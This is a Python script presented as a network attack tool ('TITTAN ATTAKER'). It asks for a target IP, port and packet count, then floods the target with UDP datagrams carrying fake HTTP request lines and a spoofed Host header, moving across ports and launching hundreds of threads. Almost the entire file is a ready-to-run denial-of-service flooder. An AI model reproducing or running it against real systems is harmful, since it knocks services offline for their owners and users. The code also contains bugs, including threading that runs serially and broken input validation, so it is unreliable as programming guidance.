
import threading
from posixpath import split
import random
import time
import socket


#============================
from datetime import datetime
#============================

socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(9999)
send_packet_count = 0
send_packet_count_check = 0
check_ip = 0
check_port = 0
fake_ip = '182.21.20.32'
#======================================

print('+=======================+')
print('+ TITTAN ATTAKER V0.0.1 +')
print('+ ORE GITHUB PROJECT URL+')
print('+ PLS JOIN ORE TELEGRAM +')
print('+ FOR NEW NEWS :@HAMYWEB+')
print('+=======================+')


print('send your ip :')
ip =input()
if len(ip.split('.')) == 4:
    check_ip = 1
#Check The ip is now ok
while check_ip < 1:
    print('INPUT ERROR : your input is not validate')
    print('send your ip address to gether : ')
    ip = input()
    if len(ip.split('.')) == 4:
        check_ip = 1

#============================================
print('send your port :')
port = int(input())
if type(int(port)) == int:
    check_port = 1
#Check The ip is now ok
while check_port < 1:
    print('INPUT ERROR : your input is not validate')
    print('send your port address to gether : ')
    port = input()
    if type(int(port)) == int:
        check_port = 1
#======================================

print('how mach you want :')
send_packet_count = int(input())

if type(int(send_packet_count)) == int:
    send_packet_count_check = 1
#Check The ip is now ok
while send_packet_count_check < 1:
    print('INPUT ERROR : your input is not validate')
    print('send your number to gether : ')
    port = input()
    if type(int(port)) == int:
        send_packet_count_check = 1
#======================================

print("waiting.")
time.sleep(1)
print('waiting..')
time.sleep(1)
print('waiting...')

#======================================

print('Start Tread One !')

i = 0
per100 = 0

def attack():
    i = 0
    while i < send_packet_count :
        global port
        global ip
        global fake_ip
        socket.connect((ip, port))
        socket.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
        socket.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
        per100 =( i / send_packet_count ) * 100
        if per100 < 10:
            results ="[                 ] {}%"
            print (results.format(per100))
        if 10 <= per100 and per100 < 20:
            results ="[==               ] {}%"
            print (results.format(per100))
        if 20 <= per100 and per100 < 30:
            results ="[===              ] {}%"
            print(results.format(per100))
        if 30 <= per100 and per100 < 40:
            results = "[====             ] {}%"
            print(results.format(per100))
        if 40 <= per100 and per100 < 50:
            results = "[=====            ] {}%"
            print(results.format(per100))
        if 50 <= per100 and per100 < 60:
            results = "[========         ] {}%"
            print(results.format(per100))
        if 60 <= per100 and per100 < 70:
            results = "[==========       ] {}%"
            print(results.format(per100))
        if 70 <= per100 and per100 < 80:
            results = "[===========      ] {}%"
            print(results.format(per100))
        if 80 <= per100 and per100 < 90:
            results = "[===============  ] {}%"
            print(results.format(per100))
        if 90 <= per100 and per100 < 100:
            results = "[================ ] {}%"
            print(results.format(per100))
        if per100 == 100:
            results = "[=================] {}%"
            print(results.format(per100))
            print('End send.')
        i = i + 1
        port = port+1
        if port == 65534:
            port = 1


i = 0
for i in range(500):
    thread = threading.Thread(target=attack())
    thread.start()



